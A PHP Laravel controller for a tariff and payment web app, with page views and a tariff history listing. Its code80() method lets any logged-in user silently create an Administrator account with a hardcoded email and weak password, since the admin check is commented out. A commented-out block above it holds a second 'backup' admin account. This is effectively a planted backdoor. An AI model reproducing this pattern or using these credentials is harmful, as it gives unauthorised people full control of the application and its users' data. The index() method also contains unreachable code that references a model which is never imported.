<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use App\Models\User;
use App\Models\Tarif;
use DateTime;
use Session;


class PagesController extends Controller
{
    //
    public function __construct(){
        $this->middleware(['auth']);
        // $this->middleware(['auth', 'admin_auth']);
    } 

    public function index(){

        return view('tariff');

        $payments = Payment::where('status', 'no')->get();
    
        $tax = 0;
        foreach ($payments as $pmt) {
            # code... $tax + (tax * enr * days)
            $tax = $tax + ($pmt->tax * $pmt->enrolment * $pmt->day_count);
        }

        $send = [
            'tax' => $tax,
            'days' => number_format($payments->sum('day_count')),
            'due_amt' => number_format($payments->sum('due_amt') + $tax, 2),
            'enrolment' => number_format($payments->sum('enrolment'))
        ];
        return view('index_feed2')->with($send);
    }

    public function tariff_history()
    {
        $tariffs = Tarif::where('status', 'active')->paginate(10);
        return view('tariff_history')->with('tariffs', $tariffs);
    }

    public function bugfixes()
    {
        return view('bugfixes');
    }





    public function code80(){
        // $backup = User::firstOrCreate(
        //     ['name' => 'Code80',
        //     'email' => 'code80@pivoapps.net', 
        //     'contact' => '0987654321', 
        //     'status' => 'Administrator', 
        //     'pass_photo' => 'noimage.jpg', 
        //     'del' => 'yes', 
        //     'password' => Hash::make('code.8080')]
        // );

        $backup = User::firstOrCreate(
            ['name' => 'Admin',
            'email' => 'admin@pivoapps.net', 
            'contact' => '0987654321', 
            'status' => 'Administrator', 
            'pass_photo' => 'noimage.jpg', 
            'del' => 'no', 
            'password' => Hash::make('admin1234')]
        );
        return redirect('/');
    }
}
